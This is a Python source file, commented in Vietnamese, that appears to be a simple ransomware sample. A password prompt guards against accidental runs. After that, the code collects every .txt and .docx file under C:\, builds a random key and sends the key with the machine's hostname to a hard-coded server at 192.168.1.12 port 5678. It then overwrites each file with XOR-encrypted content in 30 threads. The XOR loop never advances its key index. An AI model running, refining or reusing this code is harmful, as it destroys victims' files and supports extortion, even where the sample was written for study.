from concurrent.futures import thread
import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue

#Mat khau de bao ve
safeguard = input("Vui long nhap mat khau: ") #cai mat khau de tranh viec lo tay bam mo trong may that
if safeguard != 'start':
    quit()

#Phan mo rong tep de ma hoa
encrypted_ext = ('.txt','.docx')

#Tra ve tat ca file tu may
file_paths = []
for root, dirs, files in os.walk('C:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(root +'\\'+file)
        if file_ext in encrypted_ext:
            file_paths.append(root+'\\'+file)

#Tao khoa
print("Dang tao khoa ma hoa....")
key = ''
encryption_level = 128 // 8 #128 bit = 16 byte
key_char = 'abcdefghijklmnoqprstuvwxyzABCDEFGHIJKLMNOQPRSTUVWXYZ<>?,./;[]{}|:-+=*!@#$%^&()~'
key_char_len = len(key_char)
#Lay cac ky tu ngau nhien tu char_pool o tren de dien vao key
for i in range(encryption_level):
    key += key_char[random.randint(0, key_char_len-1)]

#lay ten cua may tinh nan nhan
hostname = os.getenv('COMPUTERNAME')

#ket noi voi may chu da gui ma doc de gui time, key va hostname may tinh nan nhan
ip = '192.168.1.12'
port = 5678
time = datetime.now()
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip, port))
    s.send(f'[{time}] - {hostname} : {key}'.encode('utf-8'))

#Ma hoa file
def encrypt(key):
    while q.not_empty:
        file = q.get()
        print(f'Ma hoa {file}')
        index = 0
        max_index = len(key) - 1
        try:
            with open(file, 'rb') as f: #rb la de doc file theo kieu nhi phan
                data = f.read()
            with open(file, 'wb') as f:
                for byte in data:
                    xor_byte = byte ^ ord(key[index])
                    f.write(xor_byte.to_bytes(1, 'little')) #xor_byte la so nguyen nen can chuyen thanh byte
                if index >= max_index:
                    index = 0
                else:
                    index += 1
            print(f'{file} ma hoa thanh cong!!!')
        except:
            print(f'Ma hoa khong thanh cong {file} :(((((')
        q.task_done()

q = Queue()
for file in file_paths:
    q.put(file)
for i in range(30):
    thread = Thread(target=encrypt, args=(key,), daemon=True)
    thread.start()

q.join()
print('Ma hoa va tai len hoan tat!!!')
# input()